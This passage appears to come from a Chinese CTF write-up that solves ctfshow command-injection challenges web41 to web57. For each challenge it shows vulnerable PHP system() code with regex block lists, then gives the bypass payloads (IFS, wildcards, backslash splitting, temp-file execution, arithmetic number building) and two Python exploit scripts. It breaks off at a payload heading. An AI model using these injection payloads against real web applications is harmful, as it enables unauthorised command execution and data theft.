例如源码中禁止我们使用了数字3，也就是ascii码值为51，我们可以使用或运算符在没有被禁止的字符中构造出51来，比如19和32没有被禁止，我们进行或运算19|32=51，就可以获得51这个ascii码值，也就是成功得到了数字3</p>
</blockquote>
<p>知道了方法后，我们从ascii码表，也就是0-255中找到没有被过滤的字符进行或运算，以寻求得到我们想要的字符<br>
结合了yu师傅给出的exp，我们写一个独立的python脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/10 12:56</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">if</span>(len(argv)!=<span class="number">2</span>):</span><br><span class="line">    print(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">    print(<span class="string">&#x27;USER:python exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line">    print(<span class="string">&quot;eg:  python exp.py http://ctf.show/&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;exit: input exit in function&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">url=argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#生成可用的字符</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_rce</span>():</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    preg = <span class="string">&#x27;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (re.match(preg, chr(i), re.I) <span class="keyword">or</span> re.match(preg, chr(j), re.I)):</span><br><span class="line">                k = i | j</span><br><span class="line">                <span class="keyword">if</span> k &gt;= <span class="number">32</span> <span class="keyword">and</span> k &lt;= <span class="number">126</span>:</span><br><span class="line">                    a = <span class="string">&#x27;%&#x27;</span> + hex(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                    b = <span class="string">&#x27;%&#x27;</span> + hex(j)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                    result += (chr(k) + <span class="string">&#x27; &#x27;</span> + a + <span class="string">&#x27; &#x27;</span> + b + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    f = open(<span class="string">&#x27;rce.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    f.write(result)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#根据输入的命令在生成的txt中进行匹配</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">    s1=<span class="string">&quot;&quot;</span></span><br><span class="line">    s2=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f=open(<span class="string">&quot;rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t=f.readline()</span><br><span class="line">            <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">                s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    write_rce()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s1 = input(<span class="string">&quot;\n[+] your function：&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> s1 == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        s2 = input(<span class="string">&quot;[+] your command：&quot;</span>)</span><br><span class="line">        param=action(s1) + action(s2)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)</span><br><span class="line">            &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        print(<span class="string">&quot;\n[*] result:\n&quot;</span>+r.text)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
<p>运行后，输入命令得到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web41/%7DG%40_KOG%24CK29%60OW%5BQEF%5DQMR.png" alt=""><br>
后来发现图片脚本名字打错了，是或运算噢，不要概念混淆了哈哈</p>
<h3 id="web42"><a class="header-anchor" href="#web42">¶</a>web42</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这次后面多了一个&quot; &gt;/dev/null 2&gt;&amp;1&quot;语句，意思是写入的内容会永远消失，也就是不进行回显</p>
<blockquote>
<p>1：&gt; 代表重定向到哪里，例如：echo “123” &gt; /home/123.txt<br>
2：/dev/null 代表空设备文件<br>
3：2&gt; 表示stderr标准错误<br>
4：&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1<br>
5：1 表示stdout标准输出，系统默认值是1，所以&quot;&gt;/dev/null&quot;等同于 “1&gt;/dev/null”<br>
因此，&gt;/dev/null 2&gt;&amp;1 也可以写成“1&gt; /dev/null 2&gt; &amp;1”</p>
<p>那么本文标题的语句执行过程为：<br>
1&gt;/dev/null ：首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，也就是不显示任何信息。<br>
2&gt;&amp;1 ：		接着，标准错误输出重定向到标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。</p>
</blockquote>
<p>也就是我们如果输入<code>?c=ls</code>，输出就会被吞掉不进行回显，那该怎么办呢？其实很简单，用<code>;</code>号或者<code>||</code>等等一些命令分隔符进行命令分隔<br>
payload如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;tac flag.php;</span><br></pre></td></tr></table></figure>
<h3 id="web43"><a class="header-anchor" href="#web43">¶</a>web43</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在前面基础上过滤了cat和;号，我们使用其他命令分隔符即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;tac flag.php||</span><br></pre></td></tr></table></figure>
<h3 id="web44"><a class="header-anchor" href="#web44">¶</a>web44</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">f(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/;|cat|flag/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>把flag过滤了，相信如果你从前面做到现在，心中应该也知道怎么绕过了哈哈，使用通配符进行绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;tac fla*||</span><br></pre></td></tr></table></figure>
<h3 id="web45"><a class="header-anchor" href="#web45">¶</a>web45</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这次把空格也过滤了，ok，使用%09进行绕过，%09是tab的url编码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;tac%09fla*||</span><br></pre></td></tr></table></figure>
<h3 id="web46"><a class="header-anchor" href="#web46">¶</a>web46</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这次把数字都过滤了，还把通配符<code>*</code>进行了过滤，我们可以改用<code>?</code>进行匹配，同时空格的话还是可以继续使用%09，它不属于过滤的数字范畴</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;tac%09fla?.php||</span><br></pre></td></tr></table></figure>
<h3 id="web47"><a class="header-anchor" href="#web47">¶</a>web47</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这次多过滤了几个读取文件的命令，但tac没有被过滤我们继续使用之前的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;tac%09fla?.php||</span><br></pre></td></tr></table></figure>
<p>这里补充一下一些其他命令读取的操作</p>
<blockquote>
<p>more:一页一页的显示档案内容<br>
less:与 more 类似<br>
head:查看头几行<br>
tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>
tail:查看尾几行<br>
nl：显示的时候，顺便输出行号<br>
od:以二进制的方式读取档案内容<br>
vi:一种编辑器，这个也可以查看<br>
vim:一种编辑器，这个也可以查看<br>
sort:可以查看<br>
uniq:可以查看<br>
file -f:报错出具体内容<br>
grep<br>
1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令：<br>
grep test *file<br>
strings</p>
</blockquote>
<h3 id="web48"><a class="header-anchor" href="#web48">¶</a>web48</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这次还是多过滤了一些读取的命令，tac没有被过滤，继续使用前面的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;tac%09fla?.php||</span><br></pre></td></tr></table></figure>
<h3 id="web49"><a class="header-anchor" href="#web49">¶</a>web49</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>还是没有过滤tac，继续使用前面的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;tac%09fla?.php||</span><br></pre></td></tr></table></figure>
<h3 id="web50"><a class="header-anchor" href="#web50">¶</a>web50</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这次把<code>%</code>进行了过滤，我们使用&lt;&gt;号进行绕过，这里通配符进行修改一下，&lt;&gt;和？一起没有显示出来，改用<code>\</code>进行绕过，payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;tac&lt;&gt;fla\g.php||</span><br></pre></td></tr></table></figure>
<h3 id="web51"><a class="header-anchor" href="#web51">¶</a>web51</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这次对tac进行了过滤，我们可以用<code>\</code>分割进行绕过，payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;ta\c&lt;&gt;fla\g.php||</span><br></pre></td></tr></table></figure>
<h3 id="web52"><a class="header-anchor" href="#web52">¶</a>web52</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这次过滤了尖括号，但放空了<code>$</code>符给我们，所以payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;ta\c$&#123;IFS&#125;fla\g.php||</span><br></pre></td></tr></table></figure>
<p>但emmm，好像flag改地方了<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web52/NREZX%5B2B1Q8ODJ%6060%28O_OSO.png" alt=""><br>
用ls找一下，发现在根目录<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web52/%5DGLTIXCV%7BG9W9%5D8%28C90%60L4E.png" alt=""><br>
所以真正payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;ta\c$&#123;IFS&#125;..&#x2F;..&#x2F;..&#x2F;fla?||</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web52/%60PF%7B%24%24EPXTDI%255AV%40H%5BKA6F.png" alt=""></p>
<h3 id="web53"><a class="header-anchor" href="#web53">¶</a>web53</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">echo</span>($c);</span><br><span class="line">        $d = system($c);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.$d;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这次好像只把后面的吞回显给去掉了，那我们去掉后面的<code>||</code>即可，payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;ta\c$&#123;IFS&#125;fla?.php</span><br></pre></td></tr></table></figure>
<h3 id="web54"><a class="header-anchor" href="#web54">¶</a>web54</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这次过滤了好多字母，也不能会用<code>\</code>的形式进行分割，但还有另一个读取的命令grep可以使用</p>
<blockquote>
<p>grep flag flag.php  查找flag.php文件中含有flag的那一行，并且打印出来</p>
</blockquote>
<p>所以我们可以构造payload如下，在flag.php中查找带有show字符串的一行(因为flag的格式为ctfshow{})</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;grep$&#123;IFS&#125;show$&#123;IFS&#125;fl?g.php</span><br></pre></td></tr></table></figure>
<h3 id="web55"><a class="header-anchor" href="#web55">¶</a>web55</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这次把字母都给禁掉了，一般遇到这情况最容易想到的应该是进行异或运算等等办法进行构造，在这里他没有禁掉数字，我们有其他略微方便点的方法，就是通过匹配bin下存在的命令进行读取flag</p>
<blockquote>
<p>bin为binary的简写，主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等。<br>
我们日常直接使用的cat或者ls等等都其实是简写，例如ls完整全称应该是/bin/ls</p>
</blockquote>
<p>这里没有禁用数字所以我们可以使用base64命令，构造如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;&#x2F;???&#x2F;????64 ????.???                     也就是?c&#x3D;&#x2F;bin&#x2F;base64 flag.php</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web55/2L8OFD%28V3OTMN%7D~I6%29H%24NA9.png" alt=""><br>
再进行解码即可得到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web55/PQE%7BW3WHX3_%40_%24ONV%7D7C%4032.png" alt=""></p>
<h3 id="web56"><a class="header-anchor" href="#web56">¶</a>web56</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这次在上一题的基础上多过滤掉了数字，导致我们无法使用上题的payload。不过之前看过p师傅的一篇无字母数字webshell的文章，这里我们可以利用php的特性：如果我们发送一个上传文件的post包，php会将我们上传的文件保存在临时的文件夹下，并且默认的文件目录是/tmp/phpxxxxxx。文件名最后的6个字符是随机的大小写字母，而且最后一个字符大概率是大写字母。容易想到的匹配方式就是利用<code>？</code>进行匹配，即<code>???/?????????</code>，然而这不一定会匹配到我们上传的文件，这时候有什么办法呢？<br>
在ascii码表中观察发现<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web56/0IFRV0PPH991LC%25HL%6088%24US.png" alt=""><br>
在大写字母A的前一个符号为<code>@</code>，大写字母Z的后一个字母为<code>[</code>，因此我们可以使用<code>[@-[]</code>来表示匹配大写字母，也就是变成了这样的形式：<code>???/????????[@-[]</code>，到这一步已经能匹配到了我们上传的文件，那限制了字母后该如何执行上传的文件呢？这里有个技巧，就是使用<code>. file</code>来执行文件，我们可以去操作看看<br>
在目录下新建一个f.txt，内容为ls，我们使用<code>. /home/kali/ctf_tools/a/f.txt</code>来执行文件<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web56/LKNQQ5IM_3AI%7B1LH%2420J42O.png" alt=""><br>
发现f.txt里的ls命令被成功执行，所以我们的完整payload就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;. &#x2F;???&#x2F;????????[@-[]</span><br><span class="line">并且同时上传我们的文件，文件内容里面是命令</span><br></pre></td></tr></table></figure>
<p>这里我们写个脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/11 9:14</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">&quot;http://92a3d8ba-280b-4cb8-bd47-58b577bb6204.chall.ctf.show:8080/?c=. /???/????????[@-[]&quot;</span></span><br><span class="line"></span><br><span class="line">    r = requests.post(url, files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&quot;dota.txt&quot;</span>, <span class="string">&quot;cat flag.php&quot;</span>)&#125;)</span><br><span class="line">    flag = r.text.split(<span class="string">&#x27;ctfshow&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> len(flag) &gt;<span class="number">1</span>:</span><br><span class="line">        print(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>运行完后成功获取到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web56/J36~B%25PUX3GF%7DVQASGO%5BDYX.png" alt=""></p>
<h3 id="web57"><a class="header-anchor" href="#web57">¶</a>web57</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, $c))&#123;</span><br><span class="line">        system(<span class="string">&quot;cat &quot;</span>.$c.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这题不仅过滤了字母数字，还把通配符都给过滤了。查了一下资料，发现在shell中可以利用<code>$</code>和<code>()</code>进行构造数字，而这道题提示flag在36.php中，system中已经写好cat和php，所以我们只需要构造出36即可</p>
<blockquote>
<p><code>$(())</code>                  									 代表做一次运算，因为里面为空，也表示值为0<br>
<code>$((~$(())))</code>         									对0作取反运算，值为-1<br>
<code>$(($((~$(())))$((~$(())))))</code>                 -1-1，也就是(-1)+(-1)为-2，所以值为-2<br>
<code>$((~$(($((~$(())))$((~$(())))))))</code>       再对-2做一次取反得到1，所以值为1</p>
<p>如果对取反不了解可以百度一下，这里给个容易记得式子，如果对a按位取反，则得到的结果为-(a+1)，也就是对0取反得到-1</p>
</blockquote>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web57/CHH1%24IQ%40EBHL5L%2877%5B%40%251OP.png" alt=""><br>
所以我们只要构造出-37，再进行取反，即可得到我们想要的数字36<br>
写一个脚本进行构造</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="string">&quot;$((~$((&quot;</span>+<span class="string">&quot;$((~$(())))&quot;</span>*<span class="number">37</span>+<span class="string">&quot;))))&quot;</span></span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure>
<p>payload如下</p>
